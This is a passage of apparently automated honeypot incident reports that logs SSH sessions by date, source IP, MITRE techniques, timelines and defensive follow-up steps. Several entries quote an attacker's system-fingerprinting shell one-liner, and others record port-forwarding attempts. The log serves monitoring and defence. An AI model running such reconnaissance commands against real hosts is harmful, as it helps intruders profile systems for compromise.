| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 06:03:01` | `cowrie.session.connect` |
| `2026-07-21 06:03:01` | `cowrie.client.version` |
| `2026-07-21 06:03:01` | `cowrie.client.kex` |
| `2026-07-21 06:03:03` | `cowrie.login.success` |
| `2026-07-21 06:03:04` | `cowrie.session.params` |
| `2026-07-21 06:03:04` | `cowrie.command.input` |
| `2026-07-21 06:03:04` | `cowrie.command.input` |
| `2026-07-21 06:03:04` | `cowrie.command.input` |
| `2026-07-21 06:03:04` | `cowrie.command.input` |
| `2026-07-21 06:03:04` | `cowrie.command.input` |
| `2026-07-21 06:03:04` | `cowrie.command.success` |
| `2026-07-21 06:03:04` | `cowrie.command.input` |
| `2026-07-21 06:03:04` | `cowrie.command.input` |
| `2026-07-21 06:03:04` | `cowrie.command.input` |
| `2026-07-21 06:03:04` | `cowrie.command.input` |
| `2026-07-21 06:03:04` | `cowrie.log.closed` |
| `2026-07-21 06:03:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58e17562f72f

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-21 06:03 |
| **Last Seen** | 2026-07-21 06:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 06:03:20` | `cowrie.session.connect` |
| `2026-07-21 06:03:20` | `cowrie.client.version` |
| `2026-07-21 06:03:21` | `cowrie.client.kex` |
| `2026-07-21 06:03:21` | `cowrie.login.success` |
| `2026-07-21 06:03:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-336c77ed6b8b

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-21 06:03 |
| **Last Seen** | 2026-07-21 06:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 06:03:21` | `cowrie.session.connect` |
| `2026-07-21 06:03:21` | `cowrie.client.version` |
| `2026-07-21 06:03:21` | `cowrie.client.kex` |
| `2026-07-21 06:03:22` | `cowrie.login.success` |
| `2026-07-21 06:03:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2aac3b8616b

| Field | Detail |
|---|---|
| **Source IP** | `188.43.204[.]45` |
| **First Seen** | 2026-07-21 06:04 |
| **Last Seen** | 2026-07-21 06:04 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 06:04:24` | `cowrie.session.connect` |
| `2026-07-21 06:04:25` | `cowrie.client.version` |
| `2026-07-21 06:04:25` | `cowrie.client.kex` |
| `2026-07-21 06:04:26` | `cowrie.login.success` |
| `2026-07-21 06:04:26` | `cowrie.direct-tcpip.request` |
| `2026-07-21 06:04:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.43.204[.]45` to AbuseIPDB if not already reported
- [ ] Block `188.43.204[.]45` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fcfba45bb181

| Field | Detail |
|---|---|
| **Source IP** | `61.185.30[.]170` |
| **First Seen** | 2026-07-21 06:04 |
| **Last Seen** | 2026-07-21 06:04 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 06:04:31` | `cowrie.session.connect` |
| `2026-07-21 06:04:32` | `cowrie.client.version` |
| `2026-07-21 06:04:32` | `cowrie.client.kex` |
| `2026-07-21 06:04:35` | `cowrie.login.success` |
| `2026-07-21 06:04:35` | `cowrie.direct-tcpip.request` |
| `2026-07-21 06:04:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.185.30[.]170` to AbuseIPDB if not already reported
- [ ] Block `61.185.30[.]170` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a5e0b86ed4e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 06:04 |
| **Last Seen** | 2026-07-21 06:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 06:04:57` | `cowrie.session.connect` |
| `2026-07-21 06:04:58` | `cowrie.client.version` |
| `2026-07-21 06:04:58` | `cowrie.client.kex` |
| `2026-07-21 06:04:59` | `cowrie.login.success` |
| `2026-07-21 06:05:01` | `cowrie.session.params` |
| `2026-07-21 06:05:01` | `cowrie.command.input` |
| `2026-07-21 06:05:01` | `cowrie.command.input` |
| `2026-07-21 06:05:01` | `cowrie.command.input` |
| `2026-07-21 06:05:01` | `cowrie.command.input` |
| `2026-07-21 06:05:01` | `cowrie.command.input` |
| `2026-07-21 06:05:01` | `cowrie.command.success` |
| `2026-07-21 06:05:01` | `cowrie.command.input` |
| `2026-07-21 06:05:01` | `cowrie.command.input` |
| `2026-07-21 06:05:01` | `cowrie.command.input` |
| `2026-07-21 06:05:01` | `cowrie.command.input` |
| `2026-07-21 06:05:01` | `cowrie.log.closed` |
| `2026-07-21 06:05:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4031c51613f2

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 06:06 |
| **Last Seen** | 2026-07-21 06:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 06:06:58` | `cowrie.session.connect` |
| `2026-07-21 06:06:58` | `cowrie.client.version` |
| `2026-07-21 06:06:58` | `cowrie.client.kex` |
| `2026-07-21 06:07:00` | `cowrie.login.success` |
| `2026-07-21 06:07:01` | `cowrie.session.params` |
| `2026-07-21 06:07:01` | `cowrie.command.input` |
| `2026-07-21 06:07:01` | `cowrie.command.input` |
| `2026-07-21 06:07:01` | `cowrie.command.input` |
| `2026-07-21 06:07:01` | `cowrie.command.input` |
| `2026-07-21 06:07:01` | `cowrie.command.input` |
| `2026-07-21 06:07:01` | `cowrie.command.success` |
| `2026-07-21 06:07:01` | `cowrie.command.input` |
| `2026-07-21 06:07:01` | `cowrie.command.input` |
| `2026-07-21 06:07:01` | `cowrie.command.input` |
| `2026-07-21 06:07:01` | `cowrie.command.input` |
| `2026-07-21 06:07:02` | `cowrie.log.closed` |
| `2026-07-21 06:07:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c0b3c660d0e

| Field | Detail |
|---|---|
| **Source IP** | `197.242.170[.]10` |
| **First Seen** | 2026-07-21 06:08 |
| **Last Seen** | 2026-07-21 06:08 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 06:08:01` | `cowrie.session.connect` |
| `2026-07-21 06:08:02` | `cowrie.client.version` |
| `2026-07-21 06:08:02` | `cowrie.client.kex` |
| `2026-07-21 06:08:04` | `cowrie.login.success` |
| `2026-07-21 06:08:05` | `cowrie.direct-tcpip.request` |
| `2026-07-21 06:08:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.242.170[.]10` to AbuseIPDB if not already reported
- [ ] Block `197.242.170[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efbe9e087ff3

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 06:08 |
| **Last Seen** | 2026-07-21 06:09 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 06:08:57` | `cowrie.session.connect` |
| `2026-07-21 06:08:58` | `cowrie.client.version` |
| `2026-07-21 06:08:58` | `cowrie.client.kex` |
| `2026-07-21 06:09:00` | `cowrie.login.success` |
| `2026-07-21 06:09:04` | `cowrie.session.params` |
| `2026-07-21 06:09:04` | `cowrie.command.input` |
| `2026-07-21 06:09:04` | `cowrie.command.input` |
| `2026-07-21 06:09:04` | `cowrie.command.input` |
| `2026-07-21 06:09:04` | `cowrie.command.input` |
| `2026-07-21 06:09:04` | `cowrie.command.input` |
| `2026-07-21 06:09:04` | `cowrie.command.success` |
| `2026-07-21 06:09:04` | `cowrie.command.input` |
| `2026-07-21 06:09:04` | `cowrie.command.input` |
| `2026-07-21 06:09:04` | `cowrie.command.input` |
| `2026-07-21 06:09:04` | `cowrie.command.input` |
| `2026-07-21 06:09:04` | `cowrie.log.closed` |
| `2026-07-21 06:09:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ceee5944b521

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 06:10 |
| **Last Seen** | 2026-07-21 06:10 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 06:10:52` | `cowrie.session.connect` |
| `2026-07-21 06:10:52` | `cowrie.client.version` |
| `2026-07-21 06:10:52` | `cowrie.client.kex` |
| `2026-07-21 06:10:54` | `cowrie.login.success` |
| `2026-07-21 06:10:56` | `cowrie.session.params` |
| `2026-07-21 06:10:56` | `cowrie.command.input` |
| `2026-07-21 06:10:56` | `cowrie.command.input` |
| `2026-07-21 06:10:56` | `cowrie.command.input` |
| `2026-07-21 06:10:56` | `cowrie.command.input` |
| `2026-07-21 06:10:56` | `cowrie.command.input` |
| `2026-07-21 06:10:56` | `cowrie.command.success` |
| `2026-07-21 06:10:56` | `cowrie.command.input` |
| `2026-07-21 06:10:56` | `cowrie.command.input` |
| `2026-07-21 06:10:56` | `cowrie.command.input` |
| `2026-07-21 06:10:56` | `cowrie.command.input` |
| `2026-07-21 06:10:57` | `cowrie.log.closed` |
| `2026-07-21 06:10:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8434d00517f3

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 06:12 |
| **Last Seen** | 2026-07-21 06:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 06:12:46` | `cowrie.session.connect` |
| `2026-07-21 06:12:46` | `cowrie.client.version` |
| `2026-07-21 06:12:46` | `cowrie.client.kex` |
| `2026-07-21 06:12:48` | `cowrie.login.success` |
| `2026-07-21 06:12:49` | `cowrie.session.params` |
| `2026-07-21 06:12:49` | `cowrie.command.input` |
| `2026-07-21 06:12:49` | `cowrie.command.input` |
| `2026-07-21 06:12:49` | `cowrie.command.input` |
| `2026-07-21 06:12:49` | `cowrie.command.input` |
| `2026-07-21 06:12:49` | `cowrie.command.input` |
| `2026-07-21 06:12:49` | `cowrie.command.success` |
| `2026-07-21 06:12:49` | `cowrie.command.input` |
| `2026-07-21 06:12:49` | `cowrie.command.input` |
| `2026-07-21 06:12:49` | `cowrie.command.input` |
| `2026-07-21 06:12:49` | `cowrie.command.input` |
| `2026-07-21 06:12:50` | `cowrie.log.closed` |
| `2026-07-21 06:12:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9650a52268e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 06:14 |
| **Last Seen** | 2026-07-21 06:14 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 06:14:42` | `cowrie.session.connect` |
| `2026-07-21 06:14:42` | `cowrie.client.version` |
| `2026-07-21 06:14:42` | `cowrie.client.kex` |
| `2026-07-21 06:14:44` | `cowrie.login.success` |
| `2026-07-21 06:14:46` | `cowrie.session.params` |
| `2026-07-21 06:14:46` | `cowrie.command.input` |
| `2026-07-21 06:14:46` | `cowrie.command.input` |
| `2026-07-21 06:14:46` | `cowrie.command.input` |
| `2026-07-21 06:14:46` | `cowrie.command.input` |
| `2026-07-21 06:14:46` | `cowrie.command.input` |
| `2026-07-21 06:14:46` | `cowrie.command.success` |
| `2026-07-21 06:14:46` | `cowrie.command.input` |
| `2026-07-21 06:14:46` | `cowrie.command.input` |
| `2026-07-21 06:14:46` | `cowrie.command.input` |
| `2026-07-21 06:14:46` | `cowrie.command.input` |
| `2026-07-21 06:14:46` | `cowrie.log.closed` |
| `2026-07-21 06:14:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bae41e693d5e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 06:16 |
| **Last Seen** | 2026-07-21 06:16 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 06:16:38` | `cowrie.session.connect` |
| `2026-07-21 06:16:38` | `cowrie.client.version` |
| `2026-07-21 06:16:38` | `cowrie.client.kex` |
| `2026-07-21 06:16:40` | `cowrie.login.success` |
| `2026-07-21 06:16:41` | `cowrie.session.params` |
| `2026-07-21 06:16:41` | `cowrie.command.input` |
| `2026-07-21 06:16:42` | `cowrie.command.input` |
| `2026-07-21 06:16:42` | `cowrie.command.input` |
| `2026-07-21 06:16:42` | `cowrie.command.input` |
| `2026-07-21 06:16:42` | `cowrie.command.input` |
| `2026-07-21 06:16:42` | `cowrie.command.success` |
| `2026-07-21 06:16:42` | `cowrie.command.input` |
| `2026-07-21 06:16:42` | `cowrie.command.input` |
| `2026-07-21 06:16:42` | `cowrie.command.input` |
| `2026-07-21 06:16:42` | `cowrie.command.input` |
| `2026-07-21 06:16:42` | `cowrie.log.closed` |
| `2026-07-21 06:16:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36ff93653435

| Field | Detail |
|---|---|
| **Source IP** | `116.113.241[.]82` |
| **First Seen** | 2026-07-21 06:17 |
| **Last Seen** | 2026-07-21 06:17 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 06:17:34` | `cowrie.session.connect` |
| `2026-07-21 06:17:34` | `cowrie.client.version` |
| `2026-07-21 06:17:34` | `cowrie.client.kex` |
| `2026-07-21 06:17:36` | `cowrie.login.success` |
| `2026-07-21 06:17:36` | `cowrie.direct-tcpip.request` |
| `2026-07-21 06:17:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.113.241[.]82` to AbuseIPDB if not already reported
- [ ] Block `116.113.241[.]82` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c0b398b57f6

| Field | Detail |
|---|---|
| **Source IP** | `74.208.177[.]56` |
| **First Seen** | 2026-07-21 06:17 |
| **Last Seen** | 2026-07-21 06:17 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 06:17:41` | `cowrie.session.connect` |
| `2026-07-21 06:17:42` | `cowrie.client.version` |
| `2026-07-21 06:17:42` | `cowrie.client.kex` |
| `2026-07-21 06:17:43` | `cowrie.login.success` |
| `2026-07-21 06:17:43` | `cowrie.direct-tcpip.request` |
| `2026-07-21 06:17:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `74.208.177[.]56` to AbuseIPDB if not already reported
- [ ] Block `74.208.177[.]56` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20faea8978f0

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-21 06:18 |
| **Last Seen** | 2026-07-21 06:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 06:18:03` | `cowrie.session.connect` |
| `2026-07-21 06:18:03` | `cowrie.client.version` |
| `2026-07-21 06:18:03` | `cowrie.client.kex` |
| `2026-07-21 06:18:04` | `cowrie.login.success` |
| `2026-07-21 06:18:04` | `cowrie.session.params` |
| `2026-07-21 06:18:04` | `cowrie.command.input` |
| `2026-07-21 06:18:05` | `cowrie.log.closed` |
| `2026-07-21 06:18:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-193e8107de92

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 06:18 |
| **Last Seen** | 2026-07-21 06:18 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 06:18:37` | `cowrie.session.connect` |
| `2026-07-21 06:18:37` | `cowrie.client.version` |
| `2026-07-21 06:18:37` | `cowrie.client.kex` |
| `2026-07-21 06:18:39` | `cowrie.login.success` |
| `2026-07-21 06:18:40` | `cowrie.session.params` |
| `2026-07-21 06:18:40` | `cowrie.command.input` |
